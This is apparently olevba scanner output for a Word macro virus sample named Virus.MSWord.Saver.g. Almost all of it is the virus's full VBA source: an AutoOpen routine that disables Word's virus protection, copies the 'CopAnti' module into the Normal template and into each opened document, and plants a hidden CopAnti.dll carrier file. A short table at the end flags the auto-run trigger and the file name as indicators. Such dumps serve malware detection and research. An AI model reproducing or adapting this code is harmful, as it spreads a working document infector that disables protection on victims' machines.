olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Saver.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Saver.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CopAnti.bas 
in file: Virus.MSWord.Saver.g - OLE stream: 'Macros/VBA/CopAnti'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Setup()
Attribute Setup.VB_Description = "MS - Ìàçäàé!"
  Word.Options.VirusProtection = False
  On Error Resume Next
  
  zz = Word.ActiveDocument.FullName
  
  Application.OrganizerCopy Source:=zz, _
      Destination:=Normal.ThisDocument.FullName, Name:="CopAnti", _
      Object:=wdOrganizerObjectProjectItems
  
  Application.OrganizerDelete Source:=zz, _
      Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
      
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=zz, Name:="CopAnti", _
      Object:=wdOrganizerObjectProjectItems
  
  Application.OrganizerDelete Source:=Normal.ThisDocument.FullName, _
      Name:="Destrib", _
      Object:=wdOrganizerObjectProjectItems
      
  yy = Word.Application.Path + "\CopAnti.dll"
  
  If (Dir(yy) = "") Then
    Application.Documents.Add
    Application.Documents(1).SaveAs (yy)
    Application.Documents(1).Close SaveChanges:=False
    Word.RecentFiles.Item(1).Delete
  End If
  
  
  Application.OrganizerCopy Source:=Normal.ThisDocument.FullName, _
      Destination:=yy, Name:="CopAnti", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=zz, _
      Destination:=yy, Name:="CopAnti", _
      Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=yy, _
      Destination:=zz, Name:="CopAnti", _
      Object:=wdOrganizerObjectProjectItems
      
End Sub

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "MS - Ìàçäàé!"
  Setup
  If Word.ActiveDocument.Name = "CopAnti.dll" Then Word.ActiveDocument.Close
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|IOC       |CopAnti.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

